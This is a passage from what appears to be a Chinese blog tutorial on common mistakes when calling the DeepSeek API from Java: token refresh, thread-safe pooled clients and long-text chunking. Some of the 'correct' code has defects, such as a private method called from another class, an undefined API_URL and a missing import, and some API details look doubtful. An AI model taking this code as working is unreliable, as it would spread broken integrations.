        <span class="hljs-comment">// 鉴权失败直接抛异常，服务跟着崩</span>
        ResponseEntity&lt;String&gt; response = restTemplate.postForEntity(API_URL, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, headers), String.class);
        <span class="hljs-keyword">return</span> response.getBody();
    }
}
</code></pre>
<h3 data-id="heading-4">解决方案：实现 Token 自动刷新 + 异常兜底</h3>
<p>解决方案：实现 Token 自动刷新 + 异常兜底
核心思路：</p>
<ol>
<li>封装 Token 管理类，维护 Token 有效期，提前 1 天主动刷新；</li>
<li>增加鉴权异常捕获，触发被动刷新；</li>
<li>采用双重检查锁保证 Token 刷新的线程安全；</li>
<li>增加降级策略，Token 刷新失败时触发告警并返回兜底响应。</li>
</ol>
<h3 data-id="heading-5">完整正确代码</h3>
<p>读取配置的工具类</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.InputStream;
<span class="hljs-keyword">import</span> java.util.Properties;

<span class="hljs-comment">// 读取配置文件的工具</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PropertiesUtils</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">props</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> PropertiesUtils.class.getClassLoader().getResourceAsStream(<span class="hljs-string">"deepseek.properties"</span>)) {
            props.load(in);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"加载deepseek配置文件失败"</span>, e);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getProperty</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> props.getProperty(key);
        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"配置项["</span> + key + <span class="hljs-string">"]不存在"</span>);
        }
        <span class="hljs-keyword">return</span> value;
    }
}
</code></pre>
<p>然后是 Token 管理类和 API 调用客户端：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.http.*;
<span class="hljs-keyword">import</span> org.springframework.web.client.HttpClientErrorException;
<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;

<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-keyword">import</span> java.util.concurrent.locks.ReentrantLock;

<span class="hljs-comment">// Token 管理工具，自动刷新，线程安全</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepSeekTokenManager</span> {
    <span class="hljs-comment">// 从配置文件读</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">REFRESH_TOKEN</span> <span class="hljs-operator">=</span> PropertiesUtils.getProperty(<span class="hljs-string">"deepseek.refresh.token"</span>);
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOKEN_REFRESH_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">"https://api.deepseek.com/v1/auth/refresh"</span>;
    <span class="hljs-comment">// 30天有效期，提前1天刷新，单位都是毫秒</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">TOKEN_VALID_PERIOD</span> <span class="hljs-operator">=</span> <span class="hljs-number">30</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000L</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">REFRESH_ADVANCE</span> <span class="hljs-operator">=</span> <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000L</span>;

    <span class="hljs-comment">// 当前能用的Token、过期时间、刷新用的锁</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> String currentToken;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">long</span> expireTime;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">refreshLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();

    <span class="hljs-comment">// 单例模式</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonHolder</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">DeepSeekTokenManager</span> <span class="hljs-variable">INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeepSeekTokenManager</span>();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DeepSeekTokenManager <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> SingletonHolder.INSTANCE;
    }

    <span class="hljs-comment">// 初始化的时候就加载第一个Token</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">DeepSeekTokenManager</span><span class="hljs-params">()</span> {
        refreshToken();
    }

    <span class="hljs-comment">// 拿能用的Token，自动判断要不要刷新</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getValidToken</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-comment">// 现在的时间加提前量，快到过期时间就刷新</span>
        <span class="hljs-keyword">if</span> (now + REFRESH_ADVANCE &gt;= expireTime) {
            refreshToken();
        }
        <span class="hljs-keyword">return</span> currentToken;
    }

    <span class="hljs-comment">// 刷新Token</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refreshToken</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (System.currentTimeMillis() + REFRESH_ADVANCE &lt; expireTime) {
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 加锁后再检查一遍，防止刚释放锁别人又进来了</span>
        refreshLock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (System.currentTimeMillis() + REFRESH_ADVANCE &lt; expireTime) {
                <span class="hljs-keyword">return</span>;
            }

            <span class="hljs-comment">// 拼刷新Token的请求</span>
            <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">headers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();
            headers.setContentType(MediaType.APPLICATION_JSON);
            Map&lt;String, String&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            requestBody.put(<span class="hljs-string">"refresh_token"</span>, REFRESH_TOKEN);

            ResponseEntity&lt;Map&gt; response = restTemplate.postForEntity(
                    TOKEN_REFRESH_URL,
                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, headers),
                    Map.class
            );

            <span class="hljs-keyword">if</span> (response.getStatusCode() == HttpStatus.OK) {
                Map&lt;String, Object&gt; resBody = response.getBody();
                <span class="hljs-built_in">this</span>.currentToken = (String) resBody.get(<span class="hljs-string">"access_token"</span>);
                <span class="hljs-built_in">this</span>.expireTime = System.currentTimeMillis() + TOKEN_VALID_PERIOD;
                System.out.println(<span class="hljs-string">"Token刷新成功，新的过期时间："</span> + expireTime);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Token刷新失败，响应码："</span> + response.getStatusCode());
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            System.err.println(<span class="hljs-string">"Token刷新出问题了："</span> + e.getMessage());
            <span class="hljs-comment">// 临时延长10分钟，给运维留时间处理</span>
            <span class="hljs-built_in">this</span>.expireTime = System.currentTimeMillis() + <span class="hljs-number">10</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000L</span>;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Token刷新失败，已临时续命10分钟，赶紧查！"</span>, e);
        } <span class="hljs-keyword">finally</span> {
            refreshLock.unlock();
        }
    }
}

<span class="hljs-comment">// DeepSeek API 调用客户端（集成Token管理）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepSeekApiClient</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">API_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">"https://api.deepseek.com/v1/chat/completions"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">DeepSeekTokenManager</span> <span class="hljs-variable">tokenManager</span> <span class="hljs-operator">=</span> DeepSeekTokenManager.getInstance();

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callDeepSeek</span><span class="hljs-params">(String prompt)</span> {
        <span class="hljs-comment">// 获取有效Token</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> tokenManager.getValidToken();
        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">headers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();
        headers.set(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer "</span> + token);
        headers.setContentType(MediaType.APPLICATION_JSON);

        <span class="hljs-comment">// 构建请求体</span>
        Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        requestBody.put(<span class="hljs-string">"model"</span>, <span class="hljs-string">"deepseek-chat"</span>);
        requestBody.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(
                Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, prompt)
        ));
        requestBody.put(<span class="hljs-string">"timeout"</span>, <span class="hljs-number">30000</span>); <span class="hljs-comment">// 30秒超时</span>

        HttpEntity&lt;Map&lt;String, Object&gt;&gt; request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, headers);

        <span class="hljs-keyword">try</span> {
            ResponseEntity&lt;String&gt; response = restTemplate.postForEntity(API_URL, request, String.class);
            <span class="hljs-keyword">return</span> response.getBody();
        } <span class="hljs-keyword">catch</span> (HttpClientErrorException.Unauthorized e) {
            System.err.println(<span class="hljs-string">"鉴权失败，强制刷新Token重试："</span> + e.getMessage());
            tokenManager.refreshToken();
            <span class="hljs-comment">// 重试请求</span>
            headers.set(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer "</span> + tokenManager.getValidToken());
            HttpEntity&lt;Map&lt;String, Object&gt;&gt; retryReq = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, headers);
            <span class="hljs-keyword">return</span> restTemplate.postForEntity(API_URL, retryReq, String.class).getBody();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            System.err.println(<span class="hljs-string">"API调用出错："</span> + e.getMessage());
            <span class="hljs-keyword">return</span> <span class="hljs-string">"{\"choices\":[{\"message\":{\"content\":\"稍等一下，请求有点问题~\"}}]}"</span>;
        }
    }
}
</code></pre>
<h3 data-id="heading-6">关键优化点说明</h3>
<ol>
<li><strong>配置化</strong>：用 properties 文件存 Token，改的时候不用动代码；</li>
<li><strong>主动+被动刷新</strong>：提前1天主动刷，漏了还有401被动刷，基本不会过期；</li>
<li><strong>线程安全</strong>：双重检查锁 + 可重入锁，多线程的时候只会有一个去刷新；</li>
<li><strong>降级兜底</strong>：刷新失败临时续命10分钟，API调用错了返回友好提示，服务不会直接崩。</li>
</ol>
<h2 data-id="heading-7">二、坑 2：并发调用线程不安全，数据错乱/连接泄漏</h2>
<h3 data-id="heading-8">问题本质</h3>
<p>好多人写代码的时候，RestTemplate 不配置连接池，还把 HttpHeaders 这种东西做成全局共享的。多线程一并发就出问题：</p>
<ul>
<li>多线程并发调用时，请求头/请求体数据错乱；</li>
<li>RestTemplate 未配置连接池，高并发下出现连接泄漏、端口耗尽；</li>
<li>未做线程池隔离，API 调用超时导致线程池阻塞，影响其他业务。</li>
</ul>
<h3 data-id="heading-9">典型错误代码</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误示例：共享非线程安全对象，无连接池，无线程池隔离</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeDeepSeekClient</span> {
    <span class="hljs-comment">// 错误：RestTemplate未配置连接池，高并发下连接泄漏</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();
    <span class="hljs-comment">// 错误：共享HttpHeaders，多线程下数据错乱</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">sharedHeaders</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();

    <span class="hljs-keyword">static</span> {
        sharedHeaders.set(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer sk-xxxxxxxx"</span>);
        sharedHeaders.setContentType(MediaType.APPLICATION_JSON);
    }

    <span class="hljs-comment">// 错误：无线程池，直接同步调用，超时阻塞主线程</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">concurrentCall</span><span class="hljs-params">(String prompt)</span> {
        Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <span class="hljs-comment">// HashMap也不是线程安全的</span>
        requestBody.put(<span class="hljs-string">"model"</span>, <span class="hljs-string">"deepseek-chat"</span>);
        requestBody.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(
                Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, prompt)
        ));

        <span class="hljs-comment">// 多线程下sharedHeaders可能被篡改</span>
        HttpEntity&lt;Map&lt;String, Object&gt;&gt; request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, sharedHeaders);
        <span class="hljs-comment">// 无超时配置，调用超时阻塞线程</span>
        ResponseEntity&lt;String&gt; response = restTemplate.postForEntity(API_URL, request, String.class);
        <span class="hljs-keyword">return</span> response.getBody();
    }
}
</code></pre>
<h3 data-id="heading-10">解决方案：线程池隔离 + 连接池配置 + 线程安全封装</h3>
<p>核心思路：</p>
<p>配置 RestTemplate 连接池，限制最大连接数、超时时间，避免连接泄漏；</p>
<ol>
<li>使用线程池隔离 DeepSeek API 调用，避免影响核心业务；</li>
<li>每个请求独立创建 HttpHeaders、HashMap，避免多线程共享；</li>
<li>增加请求超时、线程池拒绝策略，保证服务稳定性。</li>
</ol>
<h3 data-id="heading-11">完整正确代码</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.apache.http.client.config.RequestConfig;
<span class="hljs-keyword">import</span> org.apache.http.impl.client.CloseableHttpClient;
<span class="hljs-keyword">import</span> org.apache.http.impl.client.HttpClientBuilder;
<span class="hljs-keyword">import</span> org.apache.http.impl.conn.PoolingHttpClientConnectionManager;
<span class="hljs-keyword">import</span> org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;

<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-keyword">import</span> java.util.concurrent.*;

<span class="hljs-comment">// 线程安全的DeepSeek API客户端（含连接池、线程池配置）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadSafeDeepSeekClient</span> {
    <span class="hljs-comment">// 带连接池的RestTemplate</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> RestTemplate restTemplate;
    <span class="hljs-comment">//  配置线程池：隔离DeepSeek API调用，避免影响核心业务</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ExecutorService deepSeekExecutor;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-comment">// 1. 先配HTTP连接池，控制最大连接数</span>
        <span class="hljs-type">PoolingHttpClientConnectionManager</span> <span class="hljs-variable">connManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolingHttpClientConnectionManager</span>();
        connManager.setMaxTotal(<span class="hljs-number">100</span>); <span class="hljs-comment">// 总共最多100个连接</span>
        connManager.setDefaultMaxPerRoute(<span class="hljs-number">50</span>); <span class="hljs-comment">// 同一个地址最多50个连接</span>

        <span class="hljs-comment">// 超时配置，别卡太久</span>
        <span class="hljs-type">RequestConfig</span> <span class="hljs-variable">requestConfig</span> <span class="hljs-operator">=</span> RequestConfig.custom()
                .setConnectTimeout(<span class="hljs-number">5000</span>) <span class="hljs-comment">// 连服务器5秒超时</span>
                .setConnectionRequestTimeout(<span class="hljs-number">3000</span>) <span class="hljs-comment">// 从连接池拿连接3秒超时</span>
                .setSocketTimeout(<span class="hljs-number">30000</span>) <span class="hljs-comment">// 读数据30秒超时</span>
                .build();

        <span class="hljs-type">CloseableHttpClient</span> <span class="hljs-variable">httpClient</span> <span class="hljs-operator">=</span> HttpClientBuilder.create()
                .setConnectionManager(connManager)
                .setDefaultRequestConfig(requestConfig)
                .build();

        <span class="hljs-comment">// 把连接池配置给RestTemplate</span>
        <span class="hljs-type">HttpComponentsClientHttpRequestFactory</span> <span class="hljs-variable">requestFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpComponentsClientHttpRequestFactory</span>(httpClient);
        restTemplate = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>(requestFactory);

        <span class="hljs-comment">// 2. 再配个专用线程池</span>
        deepSeekExecutor = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
                <span class="hljs-number">10</span>, <span class="hljs-comment">// 平时保持10个活线程</span>
                <span class="hljs-number">50</span>, <span class="hljs-comment">// 最多扩到50个线程</span>
                <span class="hljs-number">60L</span>, TimeUnit.SECONDS, <span class="hljs-comment">// 空闲线程60秒没人用就关掉</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1000</span>), <span class="hljs-comment">// 任务排队最多1000个</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadFactory</span>() {
                    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
                    <span class="hljs-meta">@Override</span>
                    <span class="hljs-keyword">public</span> Thread <span class="hljs-title function_">newThread</span><span class="hljs-params">(Runnable r)</span> {
                        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r);
                        thread.setName(<span class="hljs-string">"deepseek-api-thread-"</span> + count++);
                        thread.setDaemon(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 守护线程，程序关的时候不用等它</span>
                        <span class="hljs-keyword">return</span> thread;
                    }
                },
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy() <span class="hljs-comment">// 任务满了就让调用者自己执行，别丢任务</span>
        );
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">DeepSeekTokenManager</span> <span class="hljs-variable">tokenManager</span> <span class="hljs-operator">=</span> DeepSeekTokenManager.getInstance();

    <span class="hljs-comment">// 异步调用DeepSeek API（线程安全）</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">asyncCall</span><span class="hljs-params">(String prompt)</span> {
        <span class="hljs-comment">// 把任务丢到专用线程池里</span>
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; {
            <span class="hljs-comment">// 关键：每个请求自己建请求头，别共享</span>
            <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">headers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();
            headers.set(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer "</span> + tokenManager.getValidToken());
            headers.setContentType(MediaType.APPLICATION_JSON);

            <span class="hljs-comment">// 关键：每个请求独立创建请求体，避免HashMap线程不安全问题</span>
            Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            requestBody.put(<span class="hljs-string">"model"</span>, <span class="hljs-string">"deepseek-chat"</span>);
            requestBody.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(
                    Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, prompt)
            ));
            requestBody.put(<span class="hljs-string">"temperature"</span>, <span class="hljs-number">0.7</span>); <span class="hljs-comment">// 随机性调中等</span>
            requestBody.put(<span class="hljs-string">"max_tokens"</span>, <span class="hljs-number">2000</span>); <span class="hljs-comment">// 最多返回2000个Token</span>

            HttpEntity&lt;Map&lt;String, Object&gt;&gt; request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, headers);

            <span class="hljs-keyword">try</span> {
                ResponseEntity&lt;String&gt; response = restTemplate.postForEntity(API_URL, request, String.class);
                <span class="hljs-keyword">return</span> response.getBody();
            } <span class="hljs-keyword">catch</span> (Exception e) {
                System.err.println(<span class="hljs-string">"线程"</span> + Thread.currentThread().getName() + <span class="hljs-string">"调用出错："</span> + e.getMessage());
                <span class="hljs-keyword">return</span> <span class="hljs-string">"{\"choices\":[{\"message\":{\"content\":\"请求失败，稍后再试~\"}}]}"</span>;
            }
        }, deepSeekExecutor);
    }

    <span class="hljs-comment">// 关闭线程池（应用关闭时调用）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdownExecutor</span><span class="hljs-params">()</span> {
        deepSeekExecutor.shutdown();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 等10秒，还没关完就强制关</span>
            <span class="hljs-keyword">if</span> (!deepSeekExecutor.awaitTermination(<span class="hljs-number">10</span>, TimeUnit.SECONDS)) {
                deepSeekExecutor.shutdownNow();
            }
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            deepSeekExecutor.shutdownNow();
        }
    }
}
</code></pre>
<h3 data-id="heading-12">关键优化点说明</h3>
<ol>
<li><strong>连接池限流</strong>：控制最大连接数，高并发的时候不会把服务器端口占满；</li>
<li><strong>线程池隔离</strong>：API调用出问题不会影响核心业务，拒绝策略选“调用者执行”，避免任务丢失；</li>
<li><strong>每个请求独立</strong>：请求头和请求体都自己建，彻底解决多线程数据乱的问题；</li>
<li><strong>异步提升效率</strong>：用CompletableFuture异步调用，主线程不用等，服务吞吐量直接上来。</li>
</ol>
<h2 data-id="heading-13">三、坑 3：超长文本未分块，触发 API 长度限制</h2>
<h3 data-id="heading-14">问题本质</h3>
<p>DeepSeek 的模型都有 Token 限制，比如 deepseek-chat 单轮最多大概 8192 个 Token。好多人不管文本多长都直接传，要么返回 400 说“超出长度”，要么自己瞎截断把关键信息切没了，模型回复得乱七八糟。更坑的是，有人按字数算长度，不知道中文和英文占的 Token 不一样，切完还是超。</p>
<h3 data-id="heading-15">典型错误代码</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误示例：直接传入超长文本，无分块、无Token计算</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LongTextErrorClient</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callLongText</span><span class="hljs-params">(String longContent)</span> {
        Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        requestBody.put(<span class="hljs-string">"model"</span>, <span class="hljs-string">"deepseek-chat"</span>);
        <span class="hljs-comment">// 直接把超长文本丢进去，不管长度</span>
        requestBody.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(
                Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, longContent)
        ));

        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">headers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();
        headers.set(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer "</span> + DeepSeekTokenManager.getInstance().getValidToken());
        HttpEntity&lt;Map&lt;String, Object&gt;&gt; request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, headers);
        <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();
        <span class="hljs-keyword">return</span> restTemplate.postForEntity(API_URL, request, String.class).getBody();
    }
}
</code></pre>
<h3 data-id="heading-16">解决方案：Token 计算 + 智能分块 + 结果拼接</h3>
<p>核心思路：</p>
<ol>
<li>实现 Token 计数器，准确计算文本对应的 Token 数（适配 DeepSeek 的 Token 编码规则）；</li>
<li>按模型最大 Token 限制，对超长文本进行智能分块（保留语义完整性，避免截断句子）；</li>
<li>分块调用 API 后，拼接所有分块的回复结果；</li>
<li>多轮对话场景下，优先截断历史对话，保留最新上下文。</li>
</ol>
<h3 data-id="heading-17">完整正确代码</h3>
<p>先加依赖（Maven），这个工具能精准算 Token：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.knuddels<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jtokkit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>然后是长文本处理工具：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.knuddels.jtokkit.Encodings;
<span class="hljs-keyword">import</span> com.knuddels.jtokkit.api.Encoding;
<span class="hljs-keyword">import</span> com.knuddels.jtokkit.api.EncodingRegistry;
<span class="hljs-keyword">import</span> com.knuddels.jtokkit.api.ModelType;

<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.concurrent.CompletableFuture;
<span class="hljs-keyword">import</span> java.util.stream.Collectors;

<span class="hljs-comment">// 长文本处理工具，算Token、分块、拼结果一条龙</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LongTextProcessor</span> {
    <span class="hljs-comment">// 初始化Token计算器，DeepSeek用的编码和GPT-4一样</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">EncodingRegistry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> Encodings.newDefaultEncodingRegistry();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Encoding</span> <span class="hljs-variable">encoding</span> <span class="hljs-operator">=</span> registry.getEncodingForModel(ModelType.GPT_4);
